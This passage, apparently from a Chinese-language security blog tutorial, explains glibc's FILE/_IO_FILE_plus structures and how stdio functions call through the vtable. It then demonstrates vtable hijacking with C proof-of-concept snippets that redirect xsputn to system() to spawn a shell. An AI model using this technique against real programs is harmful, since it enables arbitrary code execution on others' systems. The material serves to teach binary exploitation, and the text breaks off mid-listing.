putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>
<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p>
<p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>

<p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p>
<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
<li>返回值：返回读取到数据缓冲区中的记录个数</li>
</ul>
<p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, <span class="built_in">size</span>, count, fp)</span><br><span class="line">     <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t <span class="built_in">size</span>;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h4><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
<li>size: 要写入内容的单字节数;</li>
<li>count: 要进行写入 size 字节的数据项的个数;</li>
<li>stream: 目标文件指针;</li>
<li>返回值：实际写入的数据项个数 count。</li>
</ul>
<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p>
<p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request);</span><br></pre></td></tr></table></figure>

<p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure>

<p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure>

<p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p>
<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>filename: 目标文件的路径</li>
<li>type: 打开方式的类型</li>
<li>返回值: 返回一个文件指针</li>
</ul>
<p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p>
<p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure>

<p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure>

<p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure>

<p>总结一下 fopen 的操作是</p>
<ul>
<li>使用 malloc 分配 FILE 结构</li>
<li>设置 FILE 结构的 vtable</li>
<li>初始化分配的 FILE 结构</li>
<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<h4 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h4><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span></span><br></pre></td></tr></table></figure>

<p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
<p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure>

<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>

<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure>

<h4 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h4><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>
<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vfprintf</span>+<span class="number">11</span></span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line"><span class="built_in">write</span></span><br></pre></td></tr></table></figure>

<h3 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h3><p>前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p>
<p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p>
<p>因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p>
<p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"call 0x41414141"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 的是 vtable 中第八项之后就可以写入这个指针进行劫持。</p>
<p>并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。</p>
<p>利用这点可以实现给劫持的 vtable 函数传參，比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">"sh"</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">"hi"</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">"sh"</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">"hi"</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p>
<p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p>
<p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> &amp;_IO_2_1_stdin_</span><br><span class="line">$<span class="number">2</span> = (struct _IO_FILE_plus *) <span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00007ffff7a0d000</span> <span class="number">0x00007ffff7bcd000</span> <span class="number">0x0000000000000000</span> r-x /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7bcd000</span> <span class="number">0x00007ffff7dcd000</span> <span class="number">0x00000000001c0000</span> --- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7dcd000</span> <span 